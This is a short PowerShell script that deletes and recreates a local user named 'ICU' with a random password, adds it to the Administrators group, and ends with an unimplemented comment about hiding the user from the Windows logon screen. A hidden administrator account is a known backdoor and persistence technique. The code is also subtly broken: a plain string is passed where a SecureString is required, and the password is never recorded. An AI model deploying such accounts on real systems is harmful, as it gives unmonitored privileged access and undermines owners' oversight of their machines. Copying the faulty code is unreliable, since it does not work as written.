# Generate random password
function RandomPasswordGenerator {
    return -join ((97..122) | Get-Random -Count 10 | ForEach-Object {[char]$_})
}

$Username = "ICU"
$Password = RandomPasswordGenerator  # Corrected variable name

# Remove the local user if it exists
if (Get-LocalUser -Name $Username -ErrorAction SilentlyContinue) {
    Remove-LocalUser -Name $Username
}

# Create a new local user with administrator privileges
New-LocalUser $Username -Password $Password -FullName $Username -Description "Temporary Local Administrator"

# Add the new user to the Administrators group
Add-LocalGroupMember -Group "Administrators" -Member $Username

# Hide user from Windows logon screen
